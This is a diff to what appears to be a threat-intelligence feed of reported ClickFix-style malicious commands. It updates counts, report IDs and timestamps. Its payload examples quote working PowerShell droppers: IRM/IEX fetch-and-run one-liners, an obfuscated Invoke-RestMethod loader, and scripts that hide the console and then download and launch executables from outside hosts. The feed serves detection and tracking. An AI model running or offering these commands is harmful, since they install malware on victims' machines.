@@ -646,9 +646,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 43,
+    "ReportCount": 44,
     "FirstSeen": "2026-11-17T20:20:22.125000+00:00",
-    "LastSeen": "2026-11-24T17:30:26.562000+00:00",
+    "LastSeen": "2026-11-24T18:24:09.780000+00:00",
     "ReportIds": [
       "cmwl4zs1d1hks0omly4w82bxw",
       "cmwl832u11hzu0omltrjjp8uh",
@@ -692,7 +692,8 @@
       "cmwuwwrc505ra0nmluu7bv6rm",
       "cmwuwxtsy05ss0nmlxyc8744b",
       "cmwuxix9g06pq0nmlirq7rait",
-      "cmwuz07qy07ym0nml9jk9kcw7"
+      "cmwuz07qy07ym0nml9jk9kcw7",
+      "cmwv0xasy09ws0nmlu6n6b9bj"
     ],
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
@@ -705,6 +706,38 @@
       "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/abba73a-484e-4a80-bc53-401c1e95160d/-/raw/main/ac9eDc0-d13C-422f-8cfC-9F91441BfAb2 | IEX",
       "IRM xlfsgudhiaokbioa[.]sisterleveling[.]com/1b60ae7b-21f3-4d74-bb56-138bf4f4620b/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX"
+    ]
+  },
+  {
+    "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
+    "DistinctPayloadCount": 2,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-21T18:08:11.796000+00:00",
+    "LastSeen": "2026-11-24T18:14:07.462000+00:00",
+    "ReportIds": [
+      "cmwqq17ls27rw0oml42clk3bv",
+      "cmwv06sn108z90nmllnm9vbl9",
+      "cmwv0ke1j09ge0nml7qoagfb9"
+    ],
+    "PayloadExamples": [
+      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://swingerwives[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
+      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit"
+    ]
+  },
+  {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
+    "DistinctPayloadCount": 2,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-20T05:21:15.774000+00:00",
+    "LastSeen": "2026-11-24T18:22:20.923000+00:00",
+    "ReportIds": [
+      "cmwoj72ro1zl70omlyibpchkk",
+      "cmwv0sxv609o70nml2djvoj24",
+      "cmwv0uysm09pl0nml2qyjtgak"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
@@ -783,6 +816,21 @@
     ]
   },
   {
+    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-18T01:02:06.654000+00:00",
+    "LastSeen": "2026-11-24T18:22:42.950000+00:00",
+    "ReportIds": [
+      "cmwlf23n91ij10omln7rjkh67",
+      "cmwlf2lxn1ijq0omlk8itykij",
+      "cmwv0vfsi09qb0nmlg1r9m23j"
+    ],
+    "PayloadExamples": [
+      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
+    ]
+  },
+  {
     "Pattern": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare.io/u)\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 3,
@@ -795,20 +843,6 @@
     ],
     "PayloadExamples": [
       "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\""
-    ]
-  },
-  {
-    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-18T01:02:06.654000+00:00",
-    "LastSeen": "2026-11-18T01:02:30.368000+00:00",
-    "ReportIds": [
-      "cmwlf23n91ij10omln7rjkh67",
-      "cmwlf2lxn1ijq0omlk8itykij"
-    ],
-    "PayloadExamples": [
-      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
     ]
   },
   {
@@ -839,19 +873,6 @@
     ]
   },
   {
-    "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-21T18:08:11.796000+00:00",
-    "LastSeen": "2026-11-21T18:08:11.796000+00:00",
-    "ReportIds": [
-      "cmwqq17ls27rw0oml42clk3bv"
-    ],
-    "PayloadExamples": [
-      "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://swingerwives[.]com\"; if (Test-Path $p) { Start-Process $p }; exit"
-    ]
-  },
-  {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -862,19 +883,6 @@
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
-    ]
-  },
-  {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-20T05:21:15.774000+00:00",
-    "LastSeen": "2026-11-20T05:21:15.774000+00:00",
-    "ReportIds": [
-      "cmwoj72ro1zl70omlyibpchkk"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
